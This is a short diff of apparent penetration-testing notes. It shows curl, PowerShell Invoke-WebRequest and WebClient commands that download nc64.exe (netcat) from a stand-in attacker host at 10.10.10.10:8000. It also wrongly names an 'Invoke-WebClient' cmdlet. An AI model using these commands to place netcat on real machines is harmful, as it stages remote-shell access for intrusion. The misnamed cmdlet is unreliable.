@@ -1,0 +1,9 @@
+//curl http://10.10.10.10:8000/nc64.exe -o nc64.exe
+//In PowerShell, the equivalent of curl command using Invoke-WebRequest (iwr) is:
+
+iwr http://10.10.10.10:8000/nc64.exe -OutFile nc64.exe
+
+
+If the command fails due to execution policy restrictions or network issues, you can try Invoke-WebClient instead:
+
+(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10:8000/nc64.exe", "nc64.exe")
